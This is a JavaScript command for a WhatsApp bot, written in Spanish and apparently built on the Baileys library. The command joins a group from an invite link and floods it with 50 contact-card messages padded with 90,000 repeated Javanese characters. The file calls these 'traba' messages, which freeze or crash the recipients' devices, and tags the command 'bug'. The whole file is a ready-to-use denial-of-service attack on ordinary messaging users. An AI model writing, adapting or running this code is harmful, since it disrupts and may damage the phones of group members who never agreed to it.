let handler = async (m, { conn, text }) => { if (!text || !text.includes('chat.whatsapp.com')) { return m.reply('❌ Debes proporcionar el enlace del grupo.\nEjemplo: .atraso-ctt https://chat.whatsapp.com/XXXX'); }

const match = text.match(/chat.whatsapp.com/([0-9A-Za-z]+)/); if (!match) return m.reply('😿 Enlace inválido.');

const inviteCode = match[1]; let groupId;

try { groupId = await conn.groupAcceptInvite(inviteCode); } catch (e) { groupId = 120363${inviteCode}@g.us; }

// Solo traba con extra 
const extra = 'ꦾ'.repeat(90000); // nueva parte solicitada

await conn.sendMessage(groupId, { react: { text: 🗣, key: m.key }});

for (let i = 0; i < 50; i++) { await conn.sendMessage(groupId, { react: { text: 🎗, key: m.key }});

const msg = generateWAMessageFromContent(groupId, proto.Message.fromObject({
  contactMessage: {
    displayName: extra + '☠️𝐂𝐇𝐎𝐋𝐎☠️',
    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN: TuCuloMiado\nORG:Ashoka Uni;\nTEL;type=CELL;type=VOICE;waid=\nEND:VCARD` + extra,
  }
}), { participant: m.sender });

await conn.relayMessage(groupId, msg.message, { messageId: msg.key.id });

}

await m.reply('📇 50 contactos traba enviados al grupo con éxito.'); };

handler.command = ['atraso-ctt']; handler.tags = ['bug', 'grupo']; handler.help = ['atraso-ctt <enlace del grupo>']; export default handler;

